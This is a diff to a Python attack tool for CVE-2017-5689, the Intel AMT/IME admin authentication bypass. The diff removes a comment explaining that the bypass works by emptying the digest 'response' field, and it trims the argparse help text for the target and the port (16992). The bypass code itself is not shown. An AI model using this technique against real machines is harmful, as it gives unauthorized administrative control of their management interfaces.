@@ -1,9 +1,5 @@
 #!/usr/bin/python3
 ################################################################################
-# This is a tool to persist an Intel IME admin session by modifying the GET 
-# request to have the "response:" field empty in every request. 
-# The web portal presented by the HARDWARE uses an MD5 in the response body to
-# authenticate and per the link given, can be bypassed by simply emptying it.
 # https://www.ssh.com/vulnerability/intel-amt/
 # 
 # CVE-2017-5689
@@ -79,17 +75,17 @@ from requests.utils import parse_dict_header
 CONTENT_TYPE_FORM_URLENCODED = 'application/x-www-form-urlencoded'
 CONTENT_TYPE_MULTI_PART = 'multipart/form-data'
 #OPTIONS!
-parser = argparse.ArgumentParser(description='Intel IME Admin Bypass Tool, CVE-2017-5689')
+parser = argparse.ArgumentParser(description='CVE-2017-5689')
 parser.add_argument('--target',
                                  dest    = 'target',
                                  action  = "store" ,
                                  default = "192.168.0.44" ,
-                                 help    = "Intel IME Server To Target (http://192.168.0.1)" )
+                                 help    = "Target (http://192.168.0.1)" )
 parser.add_argument('--port',
                                  dest    = 'port',
                                  action  = "store" ,
                                  default = '16992' ,
-                                 help    = "Port for the IME Web UI (numbers only please)" )
+                                 help    = "IME Web UI Port(numbers only please)" )
 parser.add_argument('--browser',
                                  dest    = 'which_browser',
                                  action  = "store" ,
